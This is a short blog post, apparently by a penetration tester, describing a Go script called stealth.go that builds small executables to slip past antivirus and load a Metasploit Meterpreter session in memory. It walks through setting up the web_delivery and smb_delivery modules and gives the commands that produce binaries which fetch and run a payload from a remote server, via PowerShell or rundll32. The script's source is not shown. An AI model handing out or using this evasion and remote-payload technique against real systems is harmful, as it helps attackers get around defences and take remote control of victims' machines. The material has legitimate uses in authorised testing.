---
layout: post
title: Bypassing AntiVirus with Golang
---

Metasploit has two excellent modules designed to upgrade a simple shell to Meterpreter using a call to a Web server or SMB server. The first module is exploit/multi/script/web_delivery and the other is exploit/windows/smb/smb_delivery. Using these modules you can execute a simple Powershell, PHP, Python or Rundll command to upgrade your existing shell to meterpereter.

What happens if you don't have a shell though and all you can do is run an executable. You could create a meterpreter or shell payload and attempt to upload and run those executables but it is very likely that AV will catch them once they are written to disk. Instead, what if we could create a very simple executable that only makes the necessary call to web_delivery or smb_delivery and then loads meterpreter in memory? This executable will likely not be caught by AV.

The stealth.go script does exactly this. It takes a few parameters, the type of payload you want, the Metasploit server and port, and a folder name and creates a small Golang executable that makes the appropriate call to Metasploit.

To use the script you will need a recent version of Golang installed on each OS for which you plan to build an executable. After installing Golang do the following:

1. Configure the Metasploit web_delivery or smb_delivery module as needed. Note that for the web_delivery module you need to set the URIPATH parameter and on the smb_delivery module you need to set the SHARE parameter and leave the FOLDER_NAME parameter unset.

2. Run the stealth.go module to build a binary called shell (*nix) or shell.exe (Windows). 

    go run stealth.go ps 10.10.10.1 8080 test

This will build an executable that will make a Powershell call to download and execute code from http://10.10.10.1:8080/test.

    go run stealth.go smb 10.10.10.1 445 test

This will build an executable that will make a rundll32 call to \\10.10.10.1\test and execute the delivered payload.

3. Run shell or shell.exe and check your Metasploit server for a new Meterpreter session.

The stealth.go code can be found in my scripts repository on (Github)[https://github.com/averagesecurityguy/scripts].

